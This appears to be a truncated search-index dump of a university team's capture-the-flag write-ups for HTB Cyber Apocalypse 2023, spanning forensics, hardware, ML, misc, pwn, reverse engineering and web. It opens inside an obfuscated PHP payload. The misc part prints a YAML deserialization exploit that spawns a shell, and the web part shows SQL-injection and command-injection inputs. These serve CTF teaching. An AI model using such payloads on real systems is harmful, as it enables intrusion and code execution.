han:t\u0026#34;; $iyzQ5h8qf6 .= \u0026#34;elrlenjl t\u0026gt;( 0\u0026#39;eCdd0 l et0\\n\u0026#39;seu u it ;e_ dc\u0026gt;ulUd\u0026#39;T\\nxe\\$L\u0026lt;er\u0026lt;.l oh\u0026gt;c ii aert pdt iai(ed.QiJr\\n\\$i0; 0\\\u0026#34;e0\u0026#39; d= ex ].xp\\$r re \\nwSn\u0026#39;u\u0026lt;lup ]o iluE/=\u0026gt;b\\$t r\u0026gt;\\n\u0026#34;; $iyzQ5h8qf6 .= \u0026#34;h rxn ltmb \\n\u0026#39;-aodd\u0026#39;) bubaa\\nff0 i0] )- [ \u0026amp;\\\u0026#34;4 ==e[wn (r #iEa tftelF)U sspSb\\\u0026#34;\u0026#39;rd dO o e_t ppso \\n]DpneaC;aoesvp\\ni( }f0 \u0026amp; \u0026#39; \\\u0026#34;( ]0 =sc\u0026#39;o \\$s #nRmaeoi=oi)p te\u0026#34;; $iyzQ5h8qf6 .= \u0026#34;l[\u0026gt;c;\u0026gt;ia ew agP aw(d i;ep:rto\\nnor/a/\u0026lt;l )\\n( = ?;\\$r\\$0 0 \u0026#39;puwr\\$\\$d\\\u0026#34;fgVeu\u0026#39;rp\u0026#39;al l s o\u0026#39;\u0026lt;o\\n\u0026lt;rs rn \\\u0026#34;leeetu\\$y f\\nsl (en dtyjS3?e\\$) 0 \\ngem0= xrtrlsdi; l E=t\u0026gt;ma\\\u0026#34;d\u0026#34;; $iyzQ5h8qf6 .= \u0026#34;e{o iafbl\\nb. }ee \u0026lt; ptrchid\u0026gt; cia\u0026#39;\u0026#39;t s qc.p)m{ \\$(0\u0026#39; rao0 ) \u0026#39;ieid;ir\\nadR\u0026#39;o\\\\r.\u0026#39;\u0026#39;\\na ifdiro \u0026gt;\u0026#39;\\$\\ndr\u0026lt;t apmh(di\\\u0026#34;( rctE)\u0026#34;; $iyzQ5h8qf6 .= \u0026#34;e mtlur3h;o m{\\$2x odd0( )n\u0026#39;t[\\nr) gi[dcnat\\$d n Dl\u0026gt;r R k}\\\u0026#34;\u0026lt;tr twso\\$(r; i iatx;n iriei.p\\nd\\$o m0\u0026#39; u\\\u0026#34;e1\\$\\$\u0026#34;; $iyzQ5h8qf6 .= \u0026#34; t]e\u0026#39;} ) } r\u0026#39;io\\\u0026#34;c/_in \u0026#39; (ie\u0026#39;: e\u0026amp;e\\n\u0026gt;/b\u0026gt; hu( df)\\ns ptap\\nt nabrp6\\net d\\$o0 p] )ogi?f)\u0026#39;r\\n= \\n=ePrm;tfGda\u0026#34;; $iyzQ5h8qf6 .= \u0026#34; ]e\\\u0026#34;mrT;r s\u0026amp;ye\\nto\\\u0026#34;(i\\$\\\u0026#34;ii e s tici - ipryt/\\ny etd): [ \u0026amp; wrf …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"d0dfec970e4fae546cc1f520ba6ca9f6","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-for/","publishdate":"2023-03-27T10:00:00Z","relpermalink":"/blog/bkisc/htb2023-for/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Forensics category.","tags":["ctf","writeup","forensics","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","type":"blog"},{"authors":["Dang \"midas\" Le","dasHaus165","Lio"],"categories":null,"content":" ctf writeup hardware htb-2023  Table of Contents  Timed transmission  Problem Statement and Results   Critical Flight  Problem Statement Results   Debug  Problem Statement Solution Method Results   Secret Code    Timed transmission   Given file: Get it here!\n  Description: As part of your initialization sequence, your team loaded various tools into your system, but you still need to learn how to use them effectively. They have tasked you with the challenge of finding the appropriate tool to open a file containing strange serial signals. Can you rise to the challenge and find the right tool?\n  Category: Hardware\n  Difficulty: Very Easy\n  Problem Statement and Results What we have is a really strange file with .sal extension. I think the hardest part in this challenge is finding the app can open this file. After searching on Google (and Chatgpt), I found a suitable app called Logic 2. Open the file and enjoy it :D\nFlag is: HTB{b391N_tH3_HArdWAr3_QU3St}\nCritical Flight   Given file: Get it here!\n  Description: Your team has assigned you to a mission to investigate the production files of Printed Circuit Boards for irregularities. This is in response to the deployment of nonfunctional DIY drones that keep falling out of the sky. The team had used a slightly modified version of an open-source flight controller in order to save time, but it appears that someone had sabotaged the design before production. Can you help identify any suspicious alterations made to the boards?\n  Category: Hardware\n  Difficulty: Very Easy\n  Problem Statement Given a lot of GBR file. Our mission is to somehow find the flag :D.\nResults These files are called Gerber files - a standard file format used in the manufacturing of printed circuit boards (PCBs) to describe the PCB’s copper layers, solder mask, legend, and other features. To open this, reader can access this website: https://www.pcbway.com/project/OnlineGerberViewer.html. We can easily find all parts of the flag in this board:\nFlag is: HTB{533_7h3_1nn32_w02k1n95_0f_313c720n1c5#$@}\nDebug   Given file: Get it here!\n  Description: Your team has recovered a satellite dish that was used for transmitting the location of the relic, but it seems to be malfunctioning. There seems to be some interference affecting its connection to the satellite system, but there are no indications of what it could be. Perhaps the debugging interface could provide some insight, but they are unable to decode the serial signal captured during the device’s booting sequence. Can you help to decode the signal and find the source of the interference?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Hardware\n  Difficulty: Easy\n  Problem Statement We received file with .sal extension - which contains a signal capture of a device. Our mission is identify which device is captured and how to decode the signal to decrypt the communication.\nSolution Method We use Logic 2 to open this file, then receive this:\nThere is only one channel with signals so probably we are talking about UART protocol. For doing that, first we have to calculate the baud rate (bit/s).\nTo calculate the baud rate in this signal we zoom into the very first signal and see the minimun period of the signal. We can see that the smallest period between two high values is 8.68us. So, 1 bit needs at least 8.68us to be transfered. The baud rate therefore must be around 115200 (bit/s). Let’s configure the analyzer with this value:\nResults The flag is showed at the terminal, after correctly analyze the signal:\nFlag is: HTB{547311173_n37w02k_c0mp20m153d}\nSecret Code   Given zip: Get it here!\n  Description: To gain access to the tomb containing the relic, you must find a way to open the door. While scanning the surrounding area for any unusual signals, you come across a device that appears to be a fusion of various alien technologies. However, the device is broken into two pieces and you are unable to see the secret code displayed on it. The device is transmitting a new character every second and you must decipher the transmitted signals in order to retrieve the code and gain entry to the tomb.\n  Category: Hardware\n  Difficulty: Easy\n  The challenge gave us a .sal file and a folder of .gbr files.\nYou can use any Gerber file viewer software to open the .gbrjob file but in my case I used KiCad and got the following circuit board.\nWe could clearly see that this was a typical 7-segment LED display. Tracing each channel connection to the LED itself, we got the channels corresponding to the segments on the display as follow, with channel 1 being the dot.\nNext on line is the .sal file. For this I used Logic 2.\nI extracted the bits from every channels one by one using channel 1 as the clock signal. I noticed that the machine was sending a hex string so I wrote a script to decode all of it.\nc = [ …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"c14ccf5f7a282340ce5f007d5c000328","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-hw/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-hw/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Hardware category.","tags":["ctf","writeup","hardware","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Hardware","type":"blog"},{"authors":["BaoDoktah"],"categories":null,"content":" ctf writeup htb-2023  Table of Contents  Reconfiguration Mysterious Learnings Last Hope On The Rescue    Reconfiguration   Given zip: Get it here!\n  Description: As Pandora set out on her quest to find the ancient alien relic, she knew that the journey would be treacherous. The desert was vast and unforgiving, and the harsh conditions would put her cyborg body to the test. Pandora started by collecting data about the temperature and humidity levels in the desert. She used a scatter plot in an Orange Workspace file to visualize this data and identified the areas where the temperature was highest and the humidity was lowest. Using this information, she reconfigured her sensors to better withstand the extreme heat and conserve water. But, a second look at the data revealed something otherwordly, it seems that the relic’s presence beneath the surface has scarred the land in a very peculiar way, can you see it?\n  Category: Machine Learning\n  In this challenge, we embarked on a quest to find an ancient alien relic hidden beneath the desert, following the footsteps of the cyborg Pandora. The task involved analyzing temperature and humidity data and uncovering peculiar patterns that hinted at the relic’s presence.\nTo begin the analysis, we downloaded and installed the Orange data mining tool, which is an open-source data visualization and analysis tool for data scientists. You can download it here: https://orange.biolab.si/download/\nAfter installing Orange, we opened the tool and loaded the analysis.ows file. We then imported the point.csv file into the Orange workspace by adding the “File” widget and selecting the point.csv file from our computer. Next, we created a scatter plot to visualize the data. We added the “Scatter Plot” widget from “Visualize” panel to the workspace and connected it to the “File” widget.\nBy viewing the “Scatter Plot”, we got the flag:\nFlag is: HTB{sc4tter_pl0ts_4_th3_w1n}\nMysterious Learnings   Given zip: Get it here!\n  Description: One day the archeologist came across a strange metal plate covered in uncommon hieroglyphics. It looked like blueprints for some kind of alien technology. “What kind of magic is this?” He studied the plate more closely and was amazed by the advanced technology and incredible engineering they were using at a time like this. This could only lead him in him wanting to learn more…\n  Category: Machine Learning\n  In this challenge, we were given an H5 file containing a pre-trained machine learning model. Our task was to analyze the model and extract a hidden flag.\nH5 file format, also known as Hierarchical Data Format (HDF5), is a versatile data model that can store large amounts of data efficiently. It is widely used in scientific research and engineering for storing and managing data. The format organizes data hierarchically and enables fast I/O operations.\nTo solve this challenge, we first needed to load the model from the H5 file and display its summary. We used TensorFlow and Keras libraries to achieve this. Here is the Python script:\nimport tensorflow as tf from tensorflow import keras # Load the model from the HDF5 file model = keras.models.load_model(\u0026#39;alien.h5\u0026#39;) # Display the model\u0026#39;s summary model.summary() We noticed a few strings in the layer names that seemed to be part of the flag. By combining these strings,decoded it from base64 we were able to construct the flag.\nFlag is: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}\nLast Hope   Given zip: Get it here!\n  Description: The quantum data came back and analyzed. DISASTER! Our best scientists all agree: Unfortunately our species and our whole culture are about to be eliminated. Due to abnormal behavior of the black hole’s singularity our planet is about to get swallowed. Project “ONESHOT” is our last hope…\n  Category: Machine Learning\n  In this challenge, we are given a file containing OpenQASM 2.0 code, which represents a quantum circuit. Our goal is to execute the circuit and extract the flag, which is encoded in the most frequent bitstring resulting from the measurement of the quantum circuit.\nHere’s a brief write-up of the steps taken to solve this challenge:\n  We start by reading the OpenQASM code from the file named ‘quantum_artifact.qasm’ and store it as a string.\n  Next, we use Qiskit, a Python library for quantum computing, to convert the OpenQASM code into a QuantumCircuit object.\n  We set up a quantum simulator using Qiskit’s Aer module, which allows us to simulate quantum circuits on classical computers.\n  We transpile the circuit, optimizing it for the simulator.\n  We execute the transpiled circuit on the simulator with 1024 shots, meaning the circuit is run 1024 times, and store the result.\n  From the result, we extract the counts, which is a dictionary containing the frequency of each bitstring.\n  We iterate through the counts and find the most frequent bitstring, which is the binary representation of our flag.\n  We convert the most frequent bitstring to a text string by splitting it into groups of 8 …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"d676d190107cd280d7490463c331b9fb","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-ml/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-ml/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Machine Learning category.","tags":["ctf","writeup","machine learning","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Machine Learning","type":"blog"},{"authors":["FazeCT","Lê Hoàng","Lio"],"categories":null,"content":" ctf writeup misc htb-2023  Table of Contents  Persistence Hijack Restricted Remote computation Janken nehebkaus trap The Chasm’s Crossing Conundrum Original Posts    Persistence   Description: Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom. Now it’s broken and usually returns random data, but keep trying, and you might get lucky… Legends say it works once every 1000 tries.\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Miscellaneous\n  Difficulty: Very Easy\n  We are given a website to work with. Initially, connection to the website would result in “404 Not Found”. I then went to read the descriptions, and from it, I got to know that we should send at least 1000 GET requests to /flag to maybe get the flag.\nI used this below Python script to automate the task.\nimport requests url = \u0026#34;http://64.227.41.83:30380/flag\u0026#34; for i in range(10000): response = requests.get(url) content = response.content if b\u0026#39;HTB{\u0026#39; in content: print(content) break After a short wait, we got the flag.\nFlag is: HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}\nHijack   Description: The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship’s Thermal Control System. Can you take advantage of the situation without raising any suspicion?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Miscellaneous\n  Difficulty: Easy\n  Let’s try to connect to the challenge instance.\nAnd let’s try to test out those options.\nISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxNScsIGF1dG9fY2FsaWJyYXRpb246ICdvbicsCiAgcHJvcHVsc2lvbl90ZW1wOiAnMzQzNCcsIHNvbGFyX2FycmF5X3RlbXA6ICcxMicsIHVuaXRzOiBmfQo=\nThe function in question generates a base64 encoded string representing a serialized object. To provide some context, serialization is the process of storing an object, such as an array or class, in a database for later retrieval. When the application needs to access the object, it unserializes it, or loads it from the database using a function. This can improve the efficiency of Object-Oriented Programming.\nIt is important to note, however, that serialized objects should not be vulnerable to manipulation by users. If a user creates a malicious object, it could execute unwanted code. This challenge illustrates this point by presenting us with a serialized object and its corresponding base64 encoding. This is just one example of how serialized objects can be used, and it is essential to be aware of their potential risks.\nLet’s take a look at the next options. The application is requesting a base64 encoded string of a serialized object.\nUpon examining the serialized object provided by the application, I have determined that it is a YAML-formatted Python serialized object. This article serves as an excellent illustration of how attackers can leverage YAML-based exploits to execute arbitrary code.\nHere is the script to generate a serialized object.\nimport yaml import os import base64 class Test(object): def __reduce__(self): return (os.system, (\u0026#39;sh\u0026#39;,)) serialized_data = yaml.dump(Test()) # serializing data print(base64.b64encode(serialized_data.encode()).decode()) Let’s grab the result and throw it to the application.\nFlag is: HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}\nRestricted   Given file: Get it here!\n  Description: You ’re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Miscellaneous\n  Difficulty: Easy\n  We are provided with a server and it’s source. From the source, we know that it is a SSH server.\nOne thing particular about this server is that, if the username is restricted, we will not need to provide a password to authenticate, but the user will be in restricted shell mode.\nTo cope with this, we can use a trick called SSH self loop-back, which means we initiate a SSH connection inside a SSH, since restricted shell doesn’t prevent us from using SSH commands.\nFirst, we connect to the SSH server using the …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"5e26625f4f556ad43ac815c4a147c0c0","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-misc/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-misc/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Miscellaneous category.","tags":["ctf","writeup","misc","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Miscellaneous","type":"blog"},{"authors":["FazeCT","Lio","cocay"],"categories":null,"content":" ctf writeup pwn htb-2023  Table of Contents  Initialise Connection Questionnaire Getting Started Labyrinth Pandora’s Box Void Original Posts    Initialise Connection   Description: In order to proceed, we need to start with the basics. Start an instance, connect to it via $ nc e.g. nc 127.0.0.1 1337 and send “1” to get the flag.\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Binary Exploitation/Pwnable\n  Difficulty: Very Easy\n  Just a sanity check challenge, do the same thing that is being stated in the description will grant you the flag.\nFlag is: HTB{g3t_r34dy_f0r_s0m3_pwn}\nQuestionnaire   Given file: Get it here!\n  Description: It’s time to learn some things about binaries and basic c. Connect to a remote server and answer some questions to get the flag.\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Binary Exploitation/Pwnable\n  Difficulty: Very Easy\n  We are given a binary, a C file and a netcat server to answer some questions.\nFrom the netcat, we are given some informations about the binary that we will going to work with.\nWhen compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is created. The flags added when compiling can affect the binary in various ways, like the protections. Another thing affected can be the architecture and the way it\u0026#39;s linked. If the system in which the challenge is compiled is x86_64 and no flag is specified, the ELF would be x86-64 / 64-bit. If it\u0026#39;s compiled with a flag to indicate the system, it can be x86 / 32-bit binary. To reduce its size and make debugging more difficult, the binary can be stripped or not stripped. Dynamic linking: A pointer to the linked file is included in the executable, and the file contents are not included at link time. These files are used when the program is run. Static linking: The code for all the routines called by your program becomes part of the executable file. Stripped: The binary does not contain debugging information. Not Stripped: The binary contains debugging information. The most common protections in a binary are: Canary: A random value that is generated, put on the stack, and checked before that function is left again. If the canary value is not correct-has been changed or overwritten, the application will immediately stop. NX: Stands for non-executable segments, meaning we cannot write and execute code on the stack. PIE: Stands for Position Independent Executable, which randomizes the base address of the binary as it tells the loader which virtual address it should use. RelRO: Stands for Relocation Read-Only. The headers of the binary are marked as read-only. Run the \u0026#39;file\u0026#39; command in the terminal and \u0026#39;checksec\u0026#39; inside the debugger. The output of \u0026#39;file\u0026#39; command: ✗ file test test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, for GNU/Linux 3.2.0, not stripped. The output of \u0026#39;checksec\u0026#39; command: gef➤ checksec Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial We are able to answer some first questions using these informations.\nAfter answering these questions correctly, we are provided with more informations about the binary.\nGreat job so far! Now it\u0026#39;s time to see some C code and a binary file. In the pwn_questionnaire.zip there are two files: 1. test.c 2. test The \u0026#39;test.c\u0026#39; is the source code and \u0026#39;test\u0026#39; is the output binary. Let\u0026#39;s start by analyzing the code. First of all, let\u0026#39;s focus on the \u0026#39;#include \u0026lt;stdio.h\u0026gt;\u0026#39; line. It includes the \u0026#39;stdio.h\u0026#39; header file to use some of the standard functions like \u0026#39;printf()\u0026#39;. The same principle applies for the \u0026#39;#include \u0026lt;stdlib.h\u0026gt;\u0026#39; line, for other functions like \u0026#39;system()\u0026#39;. Now, let\u0026#39;s take a closer look at: void main(){ vuln(); } By default, a binary file starts executing from the \u0026#39;main()\u0026#39; function. In this case, \u0026#39;main()\u0026#39; only calls another function, \u0026#39;vuln()\u0026#39;. The function \u0026#39;vuln()\u0026#39; has 3 lines. void vuln(){ char buffer[0x20] = {0}; fprintf(stdout, \u0026#34;\\nEnter payload here: \u0026#34;); fgets(buffer, 0x100, stdin); } The first line declares a 0x20-byte buffer of characters and fills it with zeros. The second line calls \u0026#39;fprintf()\u0026#39; to print a message to stdout. Finally, the third line calls \u0026#39;fgets()\u0026#39; to read 0x100 bytes from stdin and store them to the aformentioned buffer. Then, there is a custom \u0026#39;gg()\u0026#39; function which calls the standard \u0026#39;system()\u0026#39; function to print the flag. This function is never called by default. void gg(){ system(\u0026#34;cat flag.txt\u0026#34;); } Run the \u0026#39;man \u0026lt;function_name\u0026gt;\u0026#39; command to see the manual page of a standard function (e.g. man fgets). We are also able to answer some next questions using these informations.\nAfter answering these questions correctly, we are provided with MORE and MORE informations about the binary.\nExcellent! Now …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"dac2084d2ac1e9a0281f239f83b43a59","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-pwn/","publishdate":"2023-03-27T10:00:00Z","relpermalink":"/blog/bkisc/htb2023-pwn/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Pwnable category.","tags":["ctf","writeup","pwn","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Pwnable","type":"blog"},{"authors":["FazeCT","BaoDoktah"],"categories":null,"content":" ctf writeup re htb-2023  Table of Contents  Shattered Tablet Needle in a Haystack She Shells C Shells Hunting License Cave System Alien Saboteur Somewhat Linear Analogue Signal Processing v2 Original Posts    Shattered Tablet   Given file: Get it here!\n  Description: Deep in an ancient tomb, you’ve discovered a stone tablet with secret information on the locations of other relics. However, while dodging a poison dart, it slipped from your hands and shattered into hundreds of pieces. Can you reassemble it and read the clues?\n  Category: Reverse Engineering\n  Difficulty: Very Easy\n  Reverse Engineering category greets us with a binary. I used IDA Pro to decompile the binary.\nIn the main function, the input is being checked through an if clause.\nI used angr to get the input (you can refer to this and this, too to get the hang of angr).\nHere is the Python script.\nimport angr p = angr.Project(\u0026#39;E:/Downloads/tablet\u0026#39;) simgr = p.factory.simulation_manager(p.factory.entry_state()) simgr.explore(find=0x401359, avoid=0x401367) for i in range(3): print(simgr.found[0].posix.dumps(i)) We have to find the address of puts(“Yes! That’s right!”); and avoid the address of puts(“No… not that”);. Also, we have to increase each of the address by 0x400000 due to the fact that this binary is PIE-enabled.\nFlag is: HTB{br0k3n_4p4rt,n3ver_t0_b3_r3p41r3d}\nNeedle in a Haystack   Given file: Get it here!\n  Description: You’ve obtained an ancient alien Datasphere, containing categorized and sorted recordings of every word in the forgotten intergalactic common language. Hidden within it is the password to a tomb, but the sphere has been worn with age and the search function no longer works, only playing random recordings. You don’t have time to search through every recording - can you crack it open and extract the answer?\n  Category: Reverse Engineering\n  Difficulty: Very Easy\n  We are given an another binary. Again, load the binary using IDA Pro.\nThis time, the main algorithm of the binary is to print out a random element from the given list, and guess what, the flag is also there!\nFlag is: HTB{d1v1ng_1nt0_th3_d4tab4nk5}\nShe Shells C Shells   Given file: Get it here!\n  Description: You’ve arrived in the Galactic Archive, sure that a critical clue is hidden here. You wait anxiously for a terminal to boot up, hiding in the shadows from the guards hunting for you. Unfortunately, it looks like you’ll need a password to get what you need without setting off the alarms…\n  Category: Reverse Engineering\n  Difficulty: Very Easy\n  We get another binary, and it’s time to use IDA Pro to decompile it.\nLoad the binary, we notice the function func_flag. Let’s check that out!\nfgets(s, 256, stdin); for ( i = 0; i \u0026lt;= 0x4C; ++i ) s[i] ^= m1[i]; if ( memcmp(s, \u0026amp;t, 0x4DuLL) ) return 0xFFFFFFFFLL; for ( j = 0; j \u0026lt;= 0x4C; ++j ) s[j] ^= m2[j]; printf(\u0026#34;Flag: %s\\n\u0026#34;, s); return 0LL; This is the main part of the function. Our input string s will be used to XOR with two lists, m1 and m2. We can use export data in IDA to dump out the contents of m1 and m2, as shown below (do the same for m2).\nWe also know that after the first XOR, s needs to be equal to t (which we can get from the memory, too). Then we can reverse XOR to find s, and the algorithm looks like this.\nt[i] ^ m1[i] = s[i % 8] Since after the check, we continue to XOR m2 with the modified s (which should be equal to t after the memcmp), we get the algorithm to print out our flag.\nt[i] ^ m2[i] = flag[i] We can use this Python script to get the flag.\nm2 = [ 0x64, 0x1E, 0xF5, 0xE2, 0xC0, 0x97, 0x44, 0x1B, 0xF8, 0x5F, 0xF9, 0xBE, 0x18, 0x5D, 0x48, 0x8E, 0x91, 0xE4, 0xF6, 0xF1, 0x5C, 0x8D, 0x26, 0x9E, 0x2B, 0xA1, 0x02, 0xF7, 0xC6, 0xF7, 0xE4, 0xB3, 0x98, 0xFE, 0x57, 0xED, 0x4A, 0x4B, 0xD1, 0xF6, 0xA1, 0xEB, 0x09, 0xC6, 0x99, 0xF2, 0x58, 0xFA, 0xCB, 0x6F, 0x6F, 0x5E, 0x1F, 0xBE, 0x2B, 0x13, 0x8E, 0xA5, 0xA9, 0x99, 0x93, 0xAB, 0x8F, 0x70, 0x1C, 0xC0, 0xC4, 0x3E, 0xA6, 0xFE, 0x93, 0x35, 0x90, 0xC3, 0xC9, 0x10, 0xE9] t = [0x2C,0x4A,0x0B7,0x99,0x0A3,0x0E5,0x70,0x78,0x93,0x6E,0x97,0x0D9,0x47,0x6D,0x38,0x0BD,0x0FF,0x0BB,0x85,0x99,0x6F,0xE1,0x4A,0x0AB,0x74,0x0C3,0x7B,0x0A8,0x0B2,0x9F,0x0D7,0x0EC,0x0EB,0x0CD,0x63,0x0B2,0x39,0x23,0x0E1,0x84,0x92,0x96,0x09,0x0C6,0x99,0x0F2,0x58,0x0FA,0x0CB,0x6F,0x6F,0x5E,0x1F,0x0BE,0x2B,0x13,0x8E,0x0A5,0x0A9,0x99,0x93,0x0AB,0x8F,0x70,0x1C,0x0C0,0x0C4,0x3E,0x0A6,0x0FE,0x93,0x35,0x90,0x0C3,0x0C9,0x10,0x0E9] for i in range(len(t)): print(end=chr(t[i] ^ m2[i])) Flag is: HTB{cr4ck1ng_0p3n_sh3ll5_by_th3_s34_sh0r3}\nHunting License   Given file: Get it here!\n  Description: STOP! Adventurer, have you got an up to date relic hunting license? If you don’t, you’ll need to take the exam again before you’ll be allowed passage into the spacelanes!\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Reverse Engineering\n  Difficulty: Easy\n  We are given a binary file, together with a netcat server.\nBy …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"114ab32d7c46799cba1e2d214fc1afd5","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-re/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-re/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Reverse Engineering category.","tags":["ctf","writeup","re","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Reverse Engineering","type":"blog"},{"authors":["Lê Hoàng","hdthinh1012","FazeCT"],"categories":null,"content":" ctf writeup web-exploitation htb-2023  Table of Contents  Introduction Trapped Source Gunhead Drobots Passman Orbital Didactic Octo Paddles SpyBug TrapTrack Original Posts    Introduction Welcome to our blog post about the web challenges in the HTB Cyber Apocalypse 2023 competition! For those who may not be familiar, HTB (Hack The Box) is a platform that provides a range of cybersecurity challenges for users to test and improve their skills. Cyber Apocalypse 2023 was a massive virtual event that took place in February 2023, where thousands of participants from all over the world competed in a range of challenges, including web, crypto, reverse engineering, and more.\nWe were able to reach 29th place and solve 60/74 challenges. Particularly for web challenges, we got 8/9 (the one we didn’t solve was Unearthly Shop).\nIn this blog post, we will focus specifically on the web challenges in the Cyber Apocalypse 2023 competition. We will provide a detailed analysis of each challenge, along with our thought process and the techniques we used to solve them. Whether you’re an aspiring cybersecurity professional or a seasoned veteran, we hope you find our write-ups informative and helpful!\nTrapped Source   Description: Intergalactic Ministry of Spies tested Pandora’s movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Web Exploitation\n  Difficulty: Very Easy\n  We are given a website that looks like it requires us to input the right password on a locker to process.\nView page source to see if anything is given, and we can see the correct pin is 8291.\nInput the correct pin and we get the flag for the challenge.\nFlag is: HTB{V13w_50urc3_c4n_b3_u53ful!!!}\nGunhead   Given file:: Get it here\n  Description: During Pandora’s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Web Exploitation\n  Difficulty: Very Easy\n  Click the URL of the generated challenge server, we are greeted with the home page of the challenge - a pseudo management system page\nThere are 3 buttons on the right side of the info panel, we interest in the third one, which gives us the shell UI.\nType /help as instructed, the shell command returns the list of possible commands. We saw the ping command, which is familiar one for command injection challenges.\nOpen the website in Burp Suite monitored browsers, open the shell and type in the command /ping 127.0.0.1, and we see in Burp Suite HTTP history has a POST request to /api/ping\nTurn to the challenge source code, at index.php, the /api/ping route is handled the method ping of class ReconController\nReconController.ping() will create instance of ReconModel and its getOutput() method, which will pass the user-controlled ip parameters to the ping command but without any command injection filters, means this is an easy command injection chals\nEscape the ping command with the command separator ;, cat the flag, which is stored at /flag.txt in docker container\nFlag is: HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}\nDrobots   Given file: Get it here!\n  Description: Pandora’s latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Web Exploitation\n  Difficulty: Very Easy\n  We are given a website and a zip file containing the website’s source.\nAfter a quick analyze on the source, I get to understand that either we have to use SQL Injection or use a specific parameter to get to the next page.\nInput admin for the username and \u0026#34; OR 1 = 1 – - for the password, or add /home to the URL will grant you access to the next page, which turns out to also contain the flag.\nFlag is: HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}\nPassman   Given file: Get it here\n  Description: Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Web Exploitation\n  Difficulty: Easy\n  The challenge starts with …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"5d2ba25c1d1d4d049a98aa64c8b5e781","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-web/","publishdate":"2023-03-27T10:00:00Z","relpermalink":"/blog/bkisc/htb2023-web/","section":"blog","summary":"An in-depth writeup on Cyber 